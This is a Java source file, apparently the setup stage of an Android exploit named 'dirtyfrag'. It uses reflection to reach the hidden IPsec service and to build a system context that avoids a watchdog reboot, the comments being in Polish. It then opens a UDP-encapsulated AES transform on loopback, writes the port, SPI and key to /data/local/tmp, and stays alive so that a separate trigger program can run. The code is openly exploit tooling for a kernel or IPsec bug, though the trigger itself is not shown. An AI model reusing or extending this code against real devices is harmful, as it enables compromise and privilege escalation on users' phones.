import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.IBinder;
import android.os.Looper;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

public class DirtyFragSetup {
    public static void main(String[] args) throws Exception {
        Looper.prepareMainLooper();

        // ServiceManager.getService("ipsec")
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        IBinder binder = (IBinder) smClass.getMethod("getService", String.class)
            .invoke(null, "ipsec");
        if (binder == null) { System.out.println("ERROR: ipsec service not found"); return; }

        // IIpSecService.Stub.asInterface(binder)
        Object svc = Class.forName("android.net.IIpSecService$Stub")
            .getMethod("asInterface", IBinder.class).invoke(null, binder);

        // ActivityThread bez attach() — Context bez rejestracji w AMS
        // (systemMain woła attach(true), co rejestruje jako system_server
        //  i triggeruje watchdog reboot na Wear OS)
        Class<?> atClass = Class.forName("android.app.ActivityThread");
        Constructor<?> atCtor = atClass.getDeclaredConstructor();
        atCtor.setAccessible(true);
        Object at = atCtor.newInstance();
        Field scatField = atClass.getDeclaredField("sCurrentActivityThread");
        scatField.setAccessible(true);
        scatField.set(null, at);
        android.content.Context ctx = (android.content.Context)
            atClass.getMethod("getSystemContext").invoke(at);

        // IpSecManager(Context, IIpSecService)
        Class<?> svcClass = Class.forName("android.net.IIpSecService");
        Constructor<?> ctor = IpSecManager.class.getDeclaredConstructor(
            android.content.Context.class, svcClass);
        ctor.setAccessible(true);
        IpSecManager mgr = (IpSecManager) ctor.newInstance(ctx, svc);

        IpSecManager.UdpEncapsulationSocket encapSock = mgr.openUdpEncapsulationSocket();
        InetAddress lo = InetAddress.getByName("127.0.0.1");
        IpSecManager.SecurityParameterIndex spi = mgr.allocateSecurityParameterIndex(lo);

        byte[] aesKey = new byte[32];
        new SecureRandom().nextBytes(aesKey);

        DatagramSocket ds = new DatagramSocket();
        int senderPort = ds.getLocalPort();
        ds.close();

        IpSecTransform transform = new IpSecTransform.Builder(ctx)
            .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(lo, spi);

        String paramFile = "/data/local/tmp/df_params";
        try (PrintStream ps = new PrintStream(new FileOutputStream(paramFile))) {
            ps.println(encapSock.getPort());
            ps.println(spi.getSpi());
            ps.println(senderPort);
            StringBuilder sb = new StringBuilder();
            for (byte b : aesKey) sb.append(String.format("%02x", b));
            ps.println(sb.toString());
        }

        System.out.println("OK encap=" + encapSock.getPort() +
            " spi=0x" + Integer.toHexString(spi.getSpi()) +
            " sender=" + senderPort);
        System.out.println("params -> " + paramFile);
        System.out.println("Keeping alive 5 min, run dirtyfrag_test now...");
        System.out.flush();

        Thread.sleep(300000);
        transform.close(); spi.close(); encapSock.close();
    }
}
